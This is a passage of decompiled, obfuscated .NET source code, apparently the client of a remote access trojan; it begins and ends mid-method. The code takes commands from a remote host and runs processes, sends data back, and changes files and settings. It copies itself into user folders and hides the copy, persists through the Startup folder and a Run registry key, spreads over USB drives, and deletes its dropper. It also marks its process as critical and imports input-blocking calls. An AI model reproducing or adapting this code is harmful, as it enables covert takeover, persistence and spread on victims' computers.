						Class5.smethod_4('ņ', 307);
						break;
					}
				case 3353271063u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf6ed\uf6da\uf6de\uf6db\uf6d0\uf6d1\uf6d3\uf6c6", 62148), 62469), 61673), bool_0: false, 'Ƙ', 'Ơ') != 0)
					{
						break;
					}
					try
					{
						string gparam_19 = array[1];
						if (Class11.smethod_7(gparam_19, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ｨａｂｊｋ｜", 60968), 62158), 58138), bool_0: false, 'Ř', 'Š') != 0)
						{
							if (Class11.smethod_7(gparam_19, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf18d\uf1a2\uf1a7\uf1ae", 60425), 63054), 60245), bool_0: false, 'ʩ', 'ʑ') == 0)
							{
								if (GClass2.smethod_4(array[2], 'ɡ', 566) == FileAttributes.ReadOnly)
								{
									File.SetAttributes(array[2], FileAttributes.Normal);
								}
								else
								{
									File.SetAttributes(array[2], FileAttributes.ReadOnly);
								}
							}
						}
						else if (unchecked((int)Class10.smethod_10(array[2], 263, 365)) == 1)
						{
							GClass2.DRV.smethod_13(array[2], (FileAttribute)0, 301, 274);
						}
						else
						{
							GClass2.DRV.smethod_13(array[2], (FileAttribute)1, 317, 258);
						}
						break;
					}
					catch (Exception ex7)
					{
						smethod_6(ex7, 'ɹ', 606);
						Exception ex8 = ex7;
						((GClass1)GClass1_0).Send(Class11.smethod_9(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf58f\uf5b8\uf5b8\uf5a5\uf5b8\uf5b8\uf5b9", 57764), 59104), 62097), Yy, ex8.Message, 254, 168));
						Class5.smethod_4('ϡ', 916);
						break;
					}
				case 3492411834u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue0da\ue0c5\ue0d0\ue0db\ue0c0\ue0c7\ue0d9", 57721), 58279), 57934), bool_0: false, 'Ǘ', 'ǯ') == 0)
					{
						Process.Start(array[1]);
					}
					break;
				case 3446487550u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf4c6\uf4c4\uf4d5\uf4ce\uf4d3\uf4c5", 63289), 60719), 61174), bool_0: false, 'ǵ', 'Ǎ') == 0)
					{
						((GClass1)GClass1_0).Send(GClass1.smethod_3(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﮔﮖﮇﮜﮁﮗﮏﮦ\ufbb2ﮰ\ufbbc\ufbb7\ufbb6ﮡﮏ", 61841), 57879), 59426), array[1], 760, 701));
					}
					break;
				case 3418652231u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue942\ue97d\ue968\ue963\ue95d\ue97f\ue962\ue93c", 60245), 61863), 62321), bool_0: false, '\u001c', '$') == 0)
					{
						NewLateBinding.LateCall(GClass1_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﳟﳩﳢﳨ", 59876), 59285), 61957), new object[1] { Operators.ConcatenateObject((object)(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue942\ue97d\ue968\ue963\ue95d\ue97f\ue962\ue93c", 60245), 61863), 62321) + Yy), object_1) }, (string[])null, (Type[])null, (bool[])null, true);
					}
					break;
				case 3729374989u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf10a\uf10e\uf109", 60946), 61012), 61812), bool_0: false, '\u0010', '(') == 0)
					{
						SystemParametersInfoA(20, 0, ref array[1], 1);
					}
					break;
				case 3570956254u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uea60\uea7f\uea6a\uea61\uea64\uea63", 58393), 58307), 60861), bool_0: false, 'Ř', 'Š') == 0)
					{
						NewLateBinding.LateCall(GClass1_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﳟﳩﳢﳨ", 59876), 59285), 61957), new object[1] { Operators.ConcatenateObject((object)(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uea60\uea7f\uea6a\uea61\uea64\uea63", 58393), 58307), 60861) + Yy), object_1) }, (string[])null, (Type[])null, (bool[])null, true);
					}
					break;
				case 3960534180u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﭕתּﭟﭔתּכֿ", 62851), 60023), 58512), bool_0: false, 'ȡ', 'ș') == 0)
					{
						NewLateBinding.LateCall(GClass1_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﳟﳩﳢﳨ", 59876), 59285), 61957), new object[1] { Operators.ConcatenateObject((object)(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﭕתּﭟﭔתּכֿ", 62851), 60023), 58512) + Yy), object_1) }, (string[])null, (Type[])null, (bool[])null, true);
					}
					break;
				case 3848464964u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueed5\ueed9\ueec6\ueecf", 63691), 61766), 59154), bool_0: false, 'Ϲ', 'ρ') != 0)
					{
						break;
					}
					try
					{
						string gparam_14 = array[1];
						if (Class11.smethod_7(gparam_14, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf1f4\uf1fb\uf1fe\uf1f7", 63642), 58554), 60816), bool_0: false, 'π', 'ϸ') != 0)
						{
							if (Class11.smethod_7(gparam_14, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf09a\uf093\uf090\uf098\uf099\uf08e", 62633), 57650), 58828), bool_0: false, '\u0317', '\u032f') == 0)
							{
								string string_6 = GClass1.smethod_3(array[2], array[4], 109, 40);
								string string_7 = (string)(IComparable)GClass1.smethod_3(array[3], array[4], 685, 744);
								smethod_0(string_6, string_7);
							}
						}
						else
						{
							string gparam_15 = GClass1.smethod_3(array[2], array[4], 905, 972);
							string gparam_16 = (string)(IComparable<string>)GClass1.smethod_3(array[3], array[4], 399, 458);
							Class11.smethod_21(gparam_15, gparam_16, 889, '\u034f');
						}
						break;
					}
					catch (Exception ex5)
					{
						smethod_6(ex5, 'θ', 927);
						Exception ex6 = ex5;
						((GClass1)GClass1_0).Send(Class11.smethod_9(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf58f\uf5b8\uf5b8\uf5a5\uf5b8\uf5b8\uf5b9", 57764), 59104), 62097), Yy, ex6.Message, 282, 332));
						Class5.smethod_4('\u001c', 105);
						break;
					}
				case 3808875386u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf139\uf124\uf13f\uf133", 62411), 60282), 59864), bool_0: false, '\u0082', 'º') == 0)
					{
						string gparam_12 = array[1];
						smethod_20(Class4.smethod_0(Class12.smethod_9(614, 512), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8c7", 57785), 58065), 60247), RandomVariable(5, 10), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("聯紐率流", 58759), 60523), 61529), 798, 839), gparam_12, 'ͳ', 811);
						string gparam_13 = Class11.smethod_9(Class12.smethod_9(79, 41), RandomVariable(5, 10), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("聯紐率流", 58759), 60523), 61529), 977, 903);
						smethod_20(gparam_13, array[1], 'Ɏ', 534);
						Class12.smethod_18(gparam_13, Class14.smethod_3(0, 'Ė', 'Ď'), '\u0363', 877);
					}
					break;
				case 4067409757u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue461\ue461\ue46e", 63395), 57667), 62130), bool_0: false, 'ȴ', 'Ȍ') == 0)
					{
						Class10.smethod_16<Delegate, Control>((Control)(object)this, (Delegate)new ec(cc), (short)908, 'Ε');
					}
					break;
				case 4059522608u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue594\ue58b\ue59e\ue595\ue59d\ue596", 59240), 60921), 61437), bool_0: false, '\u02d8', 'ˠ') == 0)
					{
						NewLateBinding.LateCall(GClass1_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﳟﳩﳢﳨ", 59876), 59285), 61957), new object[1] { GClass1.smethod_0((object)GClass1.smethod_3(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue594\ue58b\ue59e\ue595\ue59d\ue596", 59240), 60921), 61437), Yy, 420, 481), object_1, (short)177, 190) }, (string[])null, (Type[])null, (bool[])null, true);
					}
					break;
				case 3974385709u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue284\ue293\ue295\ue280", 60556), 59266), 59840), bool_0: false, 'ζ', 'Ύ') == 0)
					{
						Class10.smethod_16<Delegate, Control>((Control)(object)this, (Delegate)new oc(och), (short)705, '\u02d8');
						((Control)this).Invoke((Delegate)new rv(rvt), new object[2]
						{
							array[1],
							array[2]
						});
					}
					break;
				case 4243340942u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue392\ue38d\ue398\ue393\ue39e\ue399", 60537), 57969), 60921), bool_0: false, 'Ĩ', 'Đ') == 0)
					{
						try
						{
							string lpCommandString = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ufde8\ufdfe\ufdefﶻﷸ\ufdffﷺ\ufdee\ufdffﷲﷴﶻ\ufdffﷴﷴ\ufde9ﶻﷴ\ufdeb\ufdfeﷵ", 59750), 60561), 63685);
							string lpReturnString = Class14.smethod_3(0, '\u036e', 'Ͷ');
							mciSendStringA(ref lpCommandString, ref lpReturnString, 0L, 0L);
							break;
						}
						catch (Exception gparam_9)
						{
							smethod_6(gparam_9, 'ʫ', 652);
							Class5.smethod_4('*', 95);
							break;
						}
					}
					break;
				case 4167568487u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueed9\ueecb\ueedc\ueede\ueed2\ueede", 58826), 63550), 62392), bool_0: false, 'ƕ', 'ƭ') == 0)
					{
						File.WriteAllText(string_1 + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue5bb\ue5b4\ue59e\ue594\ue593\ue582\ue58a\ue5d4\ue5d5\ue5bb\ue583\ue595\ue58e\ue591\ue582\ue595\ue594\ue5bb\ue582\ue593\ue584\ue5bb\ue58f\ue588\ue594\ue593\ue594", 59316), 62765), 63351), array[1]);
					}
					break;
				case 4132842947u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue1b0\ue1a6\ue1a7", 61931), 57463), 61531), bool_0: false, 'ʾ', 'ʆ') != 0)
					{
						break;
					}
					try
					{
						string gparam_2 = array[1];
						if (Class11.smethod_7(gparam_2, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf1f4\uf1fb\uf1fe\uf1f7", 63642), 58554), 60816), bool_0: false, 'Ə', 'Ʒ') != 0)
						{
							if (Class11.smethod_7(gparam_2, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf09a\uf093\uf090\uf098\uf099\uf08e", 62633), 57650), 58828), bool_0: false, 'ƌ', 'ƴ') == 0)
							{
								string gparam_3 = GClass1.smethod_3(array[2], array[4], 895, 826);
								string gparam_4 = GClass1.smethod_3(array[3], array[4], 155, 222);
								smethod_20(gparam_3, gparam_4, ':', 96);
							}
						}
						else
						{
							string gparam_5 = GClass1.smethod_3(array[2], array[4], 609, 548);
							string gparam_6 = (string)(IEquatable<string>)GClass1.smethod_3(array[3], array[4], 971, 910);
							smethod_20(gparam_5, gparam_6, 'Ε', 972);
						}
						break;
					}
					catch (Exception ex)
					{
						smethod_6(ex, 'ǜ', 507);
						Exception ex2 = ex;
						((GClass1)GClass1_0).Send(Class11.smethod_9(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf58f\uf5b8\uf5b8\uf5a5\uf5b8\uf5b8\uf5b9", 57764), 59104), 62097), Yy, ex2.Message, 166, 240));
						Class5.smethod_4('·', 194);
						break;
					}
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void dkGrWJGkB(string ServiceName)
	{
		ServiceController[] array = (ServiceController[])(Array)Class10.smethod_17(325, 'Ć');
		try
		{
			ServiceController[] array2 = array;
			int num = 0;
			ServiceController gparam_;
			while (true)
			{
				if (num < array2.Length)
				{
					gparam_ = array2[num];
					if (Class11.smethod_7(Class3.smethod_2(Class4.smethod_12<ServiceController>(gparam_, 'ʬ', (short)730), 425, 457), Class3.smethod_2(ServiceName, 558, 590), bool_0: false, 'Ο', 'Χ') == 0)
					{
						break;
					}
					num = checked(num + 1);
					continue;
				}
				return;
			}
			GForm1.smethod_25<ServiceController>(gparam_, 'Į', 'ž');
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void VGLcwppQ(string ServiceName)
	{
		ServiceController[] array = Class10.smethod_17(321, 'Ă');
		try
		{
			ServiceController[] array2 = array;
			int num = 0;
			ServiceController gparam_;
			while (true)
			{
				if (num < array2.Length)
				{
					gparam_ = array2[num];
					if (Class11.smethod_7(Class3.smethod_2(Class4.smethod_12<ServiceController>(gparam_, '\u0369', (short)799), 863, 831), Class3.smethod_2(ServiceName, 393, 489), bool_0: false, 'ɴ', 'Ɍ') == 0)
					{
						break;
					}
					num = checked(num + 1);
					continue;
				}
				return;
			}
			GForm1.smethod_25<ServiceController>(gparam_, '\u0345', '\u0314');
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_1()
	{
		((GClass1)GClass1_0).Connect(DEB(ref host), smethod_3(DEB(ref port), 730, 655));
	}

	public string xSTCWkAgg()
	{
		string text = (string)(IConvertible)Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf495\uf489\uf480\uf492\uf491\uf487\uf494\uf483\uf49a\uf48b\uf4af\uf4a5\uf4b4\uf4a9\uf4b5\uf4a9\uf4a0\uf4b2\uf49a\uf491\uf4af\uf4a8\uf4a2\uf4a9\uf4b1\uf4b5\uf49a\uf485\uf4b3\uf4b4\uf4b4\uf4a3\uf4a8\uf4b2\uf490\uf4a3\uf4b4\uf4b5\uf4af\uf4a9\uf4a8\uf49a\uf493\uf4a8\uf4af\uf4a8\uf4b5\uf4b2\uf4a7\uf4aa\uf4aa\uf49a", 57348), 62570), 57488);
		string text2 = "";
		string[] array = (string[])(Array)smethod_15(Class11.smethod_13(Registry.LocalMachine, text, 785, 812), 566, 536);
		foreach (string gparam_ in array)
		{
			string gparam_2 = (string)(ICloneable)Conversions.ToString(GClass2.smethod_7(Class11.smethod_13(Registry.LocalMachine, Class11.smethod_9(text, gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8c7", 57785), 58065), 60247), 856, 782), 958, 899), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueb32\ueb1f\ueb05\ueb06\ueb1a\ueb17\ueb0f\ueb38\ueb17\ueb1b\ueb13", 57825), 58408), 60972), '\u008d', 140));
			text2 = Class11.smethod_9(text2, gparam_2, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue3e0\ue3c3\ue3df\ue3da\ue3c7\ue3c3\ue3df\ue3dc\ue3d4\ue3de\ue3d2\ue3dd\ue3d2\ue3d4\ue3d6\ue3c1", 62136), 58547), 62780), 517, 595);
		}
		return text2;
	}

	public RegistryKey GetKey(string key)
	{
		if (key.StartsWith(GClass2.DRV.smethod_14(Registry.ClassesRoot, 660, 758)))
		{
			string name = (string)(IConvertible)Class4.smethod_6(key, GClass1.smethod_3(GClass2.DRV.smethod_14(Registry.ClassesRoot, 202, 168), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8c7", 57785), 58065), 60247), 219, 158), "", 908, 'ϴ');
			return Registry.ClassesRoot.OpenSubKey(name, writable: true);
		}
		if (key.StartsWith(GClass2.DRV.smethod_14(Registry.CurrentUser, 467, 433)))
		{
			string name = (string)(IConvertible)Class4.smethod_6(key, GClass1.smethod_3(GClass2.DRV.smethod_14(Registry.CurrentUser, 923, 1017), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8c7", 57785), 58065), 60247), 348, 281), "", 995, 'Λ');
			return Registry.CurrentUser.OpenSubKey(name, writable: true);
		}
		if (key.StartsWith(GClass2.DRV.smethod_14(Registry.LocalMachine, 574, 604)))
		{
			string name = (string)(IConvertible)Class4.smethod_6(key, GClass1.smethod_3(GClass2.DRV.smethod_14(Registry.LocalMachine, 735, 701), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8c7", 57785), 58065), 60247), 825, 892), "", 801, '\u0359');
			return Registry.LocalMachine.OpenSubKey(name, writable: true);
		}
		if (key.StartsWith(Registry.Users.Name))
		{
			string name = (string)(IConvertible)key.Replace(Registry.Users.Name + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8c7", 57785), 58065), 60247), "");
			return Registry.Users.OpenSubKey(name, writable: true);
		}
		return null;
	}

	private void method_2()
	{
		if (!((GClass1)GClass1_0).Statconnected())
		{
			((GClass1)GClass1_0).Connect(DEB(ref host), smethod_3(DEB(ref port), 467, 390));
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SystemParametersInfoA(int int_1, int int_2, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_5, int int_3);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void method_3(object sender, EventArgs e)
	{
		//IL_0708: Unknown result type (might be due to invalid IL or missing references)
		//IL_0712: Expected O, but got Unknown
		Control.set_CheckForIllegalCrossThreadCalls(false);
		try
		{
			Process[] array = smethod_21(127, 5);
			foreach (Process gparam_ in array)
			{
				try
				{
					if (method_9(new FileInfo(Class12.smethod_19(Class10.smethod_14(gparam_, 477, 478), 445, 507)), (FileInfo)LO) && smethod_22(gparam_, '*', 97) > smethod_22(Class3.smethod_13(515, 625), ';', 821))
					{
						Class5.smethod_4('\u0083', 245);
					}
				}
				catch (Exception gparam_2)
				{
					smethod_6(gparam_2, 'Κ', 957);
					Class5.smethod_4('Ɠ', 486);
				}
			}
		}
		catch (Exception gparam_3)
		{
			smethod_6(gparam_3, 'ɶ', 593);
			Class5.smethod_4('\u02fe', 651);
		}
		try
		{
			GClass2.DRV.smethod_15(RT, 'ǟ', 'ƛ');
			Class5.smethod_4('\u0338', 846);
		}
		catch (Exception gparam_4)
		{
			smethod_6(gparam_4, 'ǣ', 452);
			Class5.smethod_4('Ǻ', 399);
		}
		try
		{
			BN = new Mutex(initiallyOwned: true, RT);
		}
		catch (Exception gparam_5)
		{
			smethod_6(gparam_5, 'Ð', 247);
			Class5.smethod_4('ʸ', 718);
			Class5.smethod_4('Ǭ', 409);
		}
		if (Conversions.ToBoolean(NOCOP))
		{
			Sleep(Sleepd);
			if (Conversions.ToBoolean(Hideme))
			{
				File.SetAttributes(Class12.smethod_9(138, 238), FileAttributes.Hidden);
			}
		}
		else
		{
			if (Conversions.ToBoolean(appdata))
			{
				string text = GClass1.smethod_3(GClass2.smethod_0(Environment.SpecialFolder.ApplicationData, 'υ', 923), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8c7", 57785), 58065), 60247), 639, 570);
				struct15_0.string_0 = text;
			}
			if (Conversions.ToBoolean(Temp1))
			{
				string text2 = Class12.smethod_9(387, 485);
				struct15_0.string_0 = text2;
			}
			if (Conversions.ToBoolean(Documents))
			{
				string text3 = GClass1.smethod_3(GClass2.smethod_0(Environment.SpecialFolder.Personal, 'å', 187), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8c7", 57785), 58065), 60247), 888, 829);
				struct15_0.string_0 = text3;
			}
			if (smethod_12(Class4.smethod_0(struct15_0.string_0, flder, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8c7", 57785), 58065), 60247), EXE, 137, 208), 'ʌ', 734))
			{
				try
				{
					GForm0.smethod_3(Class4.smethod_0(struct15_0.string_0, flder, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8c7", 57785), 58065), 60247), EXE, 828, 869), 734, 767);
				}
				catch (Exception gparam_6)
				{
					smethod_6(gparam_6, 'Ŵ', 339);
					Class5.smethod_4('¥', 208);
				}
			}
			if (Class11.smethod_7(Class4.smethod_0(struct15_0.string_0, flder, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8c7", 57785), 58065), 60247), EXE, 674, 763), Class12.smethod_9(207, 171), bool_0: false, '\v', '3') != 0)
			{
				Directory.CreateDirectory(GClass1.smethod_3(struct15_0.string_0, flder, 981, 912));
				if (smethod_12(Class4.smethod_0(struct15_0.string_0, flder, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8c7", 57785), 58065), 60247), EXE, 409, 448), 'Ϯ', 956))
				{
					Class5.smethod_4('ţ', 277);
				}
				Sleep(Sleepd);
				Class11.smethod_21(Class12.smethod_19(Class10.smethod_14(Class3.smethod_13(847, 829), 927, 924), 456, 398), Class4.smethod_0(struct15_0.string_0, flder, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8c7", 57785), 58065), 60247), EXE, 738, 699), 756, '\u02c2');
				smethod_20(GClass1.smethod_3(Class12.smethod_9(972, 938), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf056\uf057\uf04f\uf015\uf04f\uf056\uf04b", 60165), 62059), 59883), 412, 473), Class12.smethod_9(179, 215), 'ʃ', 731);
				if (Conversions.ToBoolean(Hideme))
				{
					File.SetAttributes(Class12.smethod_9(682, 718), FileAttributes.Hidden);
				}
				GClass2.DRV.smethod_11(Class4.smethod_0(struct15_0.string_0, flder, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8c7", 57785), 58065), 60247), EXE, 336, 265), 690, 751);
				Class5.smethod_4('\u00ad', 219);
			}
		}
		GClass1.smethod_5(new Thread(gclass0_0.WRK, 1), 253, 154);
		ID = Class11.smethod_9(ID, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("洛", 61699), 58051), 59974), HWD(), 65, 23);
		((GClass1)GClass1_0).Connect(DEB(ref host), smethod_3(DEB(ref port), 170, 255));
		if (Conversions.ToBoolean(Star))
		{
			try
			{
				((ServerComputer)Class6.Object_3).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8c7", 57785), 58065), 60247) + STC + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue373\ue338\ue325\ue338", 60154), 57661), 59546), true);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (BD)
		{
			try
			{
				SystemEvents.add_SessionEnding((SessionEndingEventHandler)delegate
				{
					method_7();
				});
				pr(1);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (SPR)
		{
			usb.BHuEglLFLdbBahildFLDwVj = Usname + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue373\ue338\ue325\ue338", 60154), 57661), 59546);
			usb.Start();
		}
		if (Conversions.ToBoolean(melt))
		{
			try
			{
				File.Delete(File.ReadAllText(Path.GetTempPath() + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf056\uf057\uf04f\uf015\uf04f\uf056\uf04b", 60165), 62059), 59883)));
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				File.Delete(Path.GetTempPath() + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf056\uf057\uf04f\uf015\uf04f\uf056\uf04b", 60165), 62059), 59883));
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean(Hideme))
		{
			File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
		}
		try
		{
			File.Delete(Path.GetTempPath() + Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf056\uf057\uf04f\uf015\uf04f\uf056\uf04b", 60165), 62059), 59883));
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		if (Conversions.ToBoolean(RegStr))
		{
			try
			{
				RegistryKey? registryKey = Registry.CurrentUser.OpenSubKey(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue540\ue55c\ue555\ue547\ue544\ue552\ue541\ue556\ue56f\ue55e\ue55a\ue550\ue541\ue55c\ue540\ue55c\ue555\ue547\ue56f\ue544\ue55a\ue55d\ue557\ue55c\ue544\ue540\ue56f\ue550\ue546\ue541\ue541\ue556\ue55d\ue547\ue545\ue556\ue541\ue540\ue55a\ue55c\ue55d\ue56f\ue541\ue546\ue55d", 58434), 60143), 60175), writable: true);
				registryKey!.SetValue(string_3, Application.get_ExecutablePath(), RegistryValueKind.String);
				registryKey!.Close();
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	private void GForm1_FormClosing(object sender, FormClosingEventArgs e)
	{
		Process.Start(Class12.smethod_9(904, 1004));
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int BlockInput(int fBlock);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long SwapMouseButton(long bSwap);

	private void GForm1_FormClosed(object sender, FormClosedEventArgs e)
	{
		Process.Start(Class12.smethod_9(642, 742));
	}

	[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern void SendMessage(int int_1, uint uint_0, uint uint_1, int int_2);

	private void method_4(object sender, EventArgs e)
	{
		string text = (string)(IConvertible)method_11();
		if (Class11.smethod_7(struct15_0.string_3, text, bool_0: false, 'Ʈ', 'Ɩ') != 0)
		{
			string text2 = text;
			struct15_0.string_3 = text2;
			Class4.smethod_13<Timer>(vmethod_0(), 'Ĭ', 'ĥ');
			((GClass1)GClass1_0).Send(Class11.smethod_9(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf7bb\uf7ad", 60218), 60334), 63251), Yy, text, 476, 394));
			vmethod_0().Start();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_5, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_6);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long mciSendStringA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpCommandString, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpReturnString, long uReturnLength, long hwndCallback);

	private void method_5()
	{
		try
		{
			((GClass1)GClass1_0).Send(GClass1.smethod_3(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf5f0\uf5f1\uf5e1", 62127), 60334), 60483), Yy, 814, 875));
		}
		catch (Exception gparam_)
		{
			smethod_6(gparam_, '\u02f7', 720);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetWindowText(IntPtr intptr_0, StringBuilder stringBuilder_0, int int_1);

	private void method_6(object object_2, object object_3)
	{
		try
		{
			object gClass1_ = GClass1_0;
			string text = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﵫﵪ", 57933), 63353), 59445);
			string yy = Yy;
			string s = Conversions.ToString(NewLateBinding.LateGet(object_3, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("梅視充視", 60191), 61937), 57408), new object[0], (string[])null, (Type[])null, (bool[])null));
			string text2 = (string)(IComparable)ENB(ref s);
			GClass2.smethod_6<Type, string, object>(object_3, null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("梅視充視", 60191), 61937), 57408), new object[1] { s }, null, null, bool_0: true, bool_1: false, 736, 681);
			((GClass1)gClass1_).Send(text + yy + text2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_5, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_6, int int_1, ref int int_2, ref int int_3, ref int int_4, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_7, int int_5);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void Sleep(long dwMilliseconds);

	public void pr(int i)
	{
		try
		{
			NtSetInformationProcess(Class3.smethod_13(820, 838).Handle, 29, ref i, 4);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

	[DllImport("ntdll")]
	private static extern int NtSetInformationProcess(IntPtr intptr_0, int int_1, ref int int_2, int int_3);

	private void method_7()
	{
		pr(0);
	}

	private void method_8(Process process_0)
	{
